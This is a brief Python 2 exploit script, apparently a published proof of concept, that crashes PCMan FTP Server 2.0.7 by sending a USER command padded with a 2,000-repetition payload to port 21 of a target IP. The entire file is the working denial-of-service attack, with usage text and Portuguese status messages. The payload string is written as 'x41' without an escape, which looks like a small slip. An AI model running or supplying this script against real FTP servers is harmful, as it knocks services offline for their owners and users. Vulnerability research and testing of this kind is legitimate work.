#!/usr/bin/python
#
# e-mail: fernando.mengalli@gmail.com
#
# Date: 06/12/2021 - 12 jun
#
# Version Vulnerable: PCMan FTP Server 2.0.7
#
# OS Tested: Windows XP PACK 3 Brazilian

import socket
import sys

if len(sys.argv) != 2:
    print "#################################################################"
    print "#                                                               #"
    print "#  PCMan FTP Server 2.0.7 - Command 'USER' Denied of Service    #"
    print "#                                                               #"
    print "#              Author: Fernando Mengali                         #"
    print "#                                                               #"
    print "#              Usage: exploit.py <IP>                           #" 
    print "#                                                               #"
    print "#################################################################"
    sys.exit(1)
  
target = sys.argv[1]

payload = "x41"*2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect = s.connect((target, 21))
    print "[+] Conectado com sucesso"
except:
    print "[-] Falha ao conectar para o servidor..."
    sys.exit(0)
s.recv(1024)
print "[+] Autenticando..." 	
s.send('User '+payload+'\r\n')
print "[+] Enviando pacote crafted..."
s.close()
